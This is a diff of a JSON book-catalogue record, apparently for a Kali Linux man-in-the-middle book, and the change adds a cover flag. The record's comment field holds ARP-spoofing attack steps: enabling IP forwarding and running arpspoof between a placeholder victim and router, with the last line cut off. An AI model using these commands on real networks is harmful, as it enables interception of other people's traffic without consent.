@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/12442?v=1795442756",
   "cover_og_url": "/cover/12442/og?v=1795442756",
+  "has_cover": false,
   "url": "/book/mitm-kali-linux-attack-onno-widodo-purbo/",
   "rating": null,
   "comment": "# Enable port forwarding sysctl -w net.ipv4.ip_forward=1 # Spoof connection between Victim and Router # Note: Run this command in a new terminal and let it running arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP] # Same step but inverted (nope, it's not the same ...) # Note: Run this command in a new terminal and let it running arpspoof -i [Network Interface Name] -t [Router IP]",
